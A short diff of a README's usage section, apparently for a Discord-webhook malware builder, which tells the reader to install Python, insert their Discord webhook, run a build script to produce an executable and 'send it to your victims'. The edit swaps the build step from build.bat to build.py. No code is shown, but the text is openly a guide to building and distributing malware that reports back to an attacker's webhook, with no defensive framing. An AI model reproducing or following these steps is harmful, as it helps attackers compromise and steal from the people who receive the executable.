@@ -15,7 +15,7 @@ Usage is extremely simple! <br>
 
 * **1)** Firstly, make sure Python is installed. [Click Here](https://www.python.org/downloads/) to install! **NOTE:** Make sure to check "Add Python to PATH" when installing! <br>
 * **2)** Get a Discord Webhook and put it in the file. On line one where it says `webhook = ""` input your webhook between the quotes. <br>
-* **3)** Run `build.bat` and let it do it's thing! In the `dist` folder there should be an EXE. Rename it whatever and send it to your victims 😈 <br>
+* **3)** Run `build.py`, enter your webhook, and send the "compiled.exe" file to your victims! 😈 <br>
 
 # 🌠 Closing Statements
 
